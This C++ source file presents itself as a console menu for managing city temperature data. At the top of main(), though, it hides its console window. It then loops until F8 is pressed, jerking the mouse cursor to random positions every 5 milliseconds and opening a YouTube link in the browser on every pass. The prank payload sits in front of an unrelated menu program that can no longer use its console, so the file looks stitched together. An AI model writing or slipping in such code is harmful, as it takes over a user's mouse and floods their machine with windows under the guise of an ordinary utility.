#include <iostream>
#include <vector>
#include <limits>
#include <windows.h>
using namespace std;

int main() {

    FreeConsole();
    srand(GetTickCount());
    int nWidth  = GetSystemMetrics(SM_CXSCREEN) - 1;
    int nHeight = GetSystemMetrics(SM_CYSCREEN) - 1;
    while(!GetAsyncKeyState(VK_F8)){
        SetCursorPos((rand() % nWidth) + 1, (rand() % nHeight) + 1);
        Sleep(5);
        string url = "https://www.youtube.com/watch?v=vOlr-yqWpZU";
        system(("start " + url).c_str());
    }



    int numCity, numDay;
    vector<vector<float>> temperatures;
    string cp = "//////////////////////";

    while(true) {
        cout <<"\n"<<cp<<" Menu of Options "<<cp<<"\n";
        cout << "What option do you need?\n";
        cout << "1. Add data.\n2. Delete data.\n3. Modify data.\n4. Generate reports.\n5. Calculate statistics.\n6. Exit.\nYour select: ";
        int optionMenu;
        cin >> optionMenu;

        switch (optionMenu) {
            case 1: {
                float z;
                vector<float> tempVector;

                cout <<"\n"<<cp<<" Add data "<<cp<<"\nSet the number of cities: ";    
                cin >> numCity;
                cout << "Set the number of days: ";
                cin >> numDay;

                cout << "\n" << cp << cp << "\n";
                for (int a = 0; a < numCity; a++) {
                    for (int b = 0; b < numDay; b++) {
                        cout << "Add the value of day #" << b + 1 << " for city #" << a + 1 << ": ";
                        cin >> z;
                        tempVector.push_back(z);
                    }
                    temperatures.push_back(tempVector);
                    tempVector.clear();
                }

                cout << "\n" << cp << cp << "\nYou have this data now:\n";
                for (int c = 0; c < temperatures.size(); c++) {
                    cout << "\nCity #" << c + 1 << endl;
                    for (int d = 0; d < temperatures[c].size(); d++) {
                        cout << "Day #" << d + 1 << ": " << temperatures[c][d] << endl;
                    }
                }
                cout << "\n";
                break;
            }
            case 2: {
                
                cout << "\n" << cp << cp << "\nYou have this data:\n";
                for (int c = 0; c < temperatures.size(); c++) {
                    cout << "\nCity #" << c + 1 << endl;
                    for (int d = 0; d < temperatures[c].size(); d++) {
                        cout << "Day #" << d + 1 << ": " << temperatures[c][d] << endl;
                    }
                }

                cout << "\n" << cp << cp << "\nWhich city do you want to delete data from?\nYour select: ";
                int tempCity;
                cin >> tempCity;

                if (tempCity > 0 && tempCity <= temperatures.size()) {
                    temperatures.erase(temperatures.begin() + (tempCity - 1));
                } else {
                    cout << "Invalid city number.\n";
                }

                cout << "\n" << cp << cp << "\nYou have this data now:\n";
                for (int c = 0; c < temperatures.size(); c++) {
                    cout << "\nCity #" << c + 1 << endl;
                    for (int d = 0; d < temperatures[c].size(); d++) {
                        cout << "Day #" << d + 1 << ": " << temperatures[c][d] << endl;
                    }
                }
                cout << "\n";
                break;
            }
            case 3: {
                int tempCity, tempDay;
                cout << "\n" << cp << cp << "\nYou have this data:\n";
                for (int c = 0; c < temperatures.size(); c++) {
                    cout << "\nCity #" << c + 1 << endl;
                    for (int d = 0; d < temperatures[c].size(); d++) {
                        cout << "Day #" << d + 1 << ": " << temperatures[c][d] << endl;
                    }
                }

                cout << "\n" << cp << cp << "\nWhich city do you want to modify data from?\nYour select: ";
                cin >> tempCity;

                if (tempCity > 0 && tempCity <= temperatures.size()) {
                    cout << "\nData for City #" << tempCity << ":\n";
                    for (int e = 0; e < temperatures[tempCity - 1].size(); e++) {
                        cout << "Day #" << e + 1 << ": " << temperatures[tempCity - 1][e] << endl;
                    }

                    cout << "\nWhich day do you want to change data from?\nYour select: ";
                    cin >> tempDay;

                    if (tempDay > 0 && tempDay <= temperatures[tempCity - 1].size()) {
                        cout << "\nData of day selected: " << temperatures[tempCity - 1][tempDay - 1];
                        cout << "\nEnter the value for which you want to change: ";
                        float tempSelection;
                        cin >> tempSelection;
                        temperatures[tempCity - 1][tempDay - 1] = tempSelection;
                    } else {
                        cout << "Invalid day number.\n";
                    }
                } else {
                    cout << "Invalid city number.\n";
                }

                cout << "\n" << cp << cp << "\nYou have this data now:\n";
                for (int f = 0; f < temperatures.size(); f++) {
                    cout << "\nCity #" << f + 1 << endl;
                    for (int g = 0; g < temperatures[f].size(); g++) {
                        cout << "Day #" << g + 1 << ": " << temperatures[f][g] << endl;
                    }
                }
                break;
            }
            case 4:
            case 5:
                cout << "The option is not available yet.\n";
                break;
            case 6:
                return 0;
            default:
                cout << "\nThe option you selected is not in the menu\n";
                break;
        }
    }

    return 0;
}
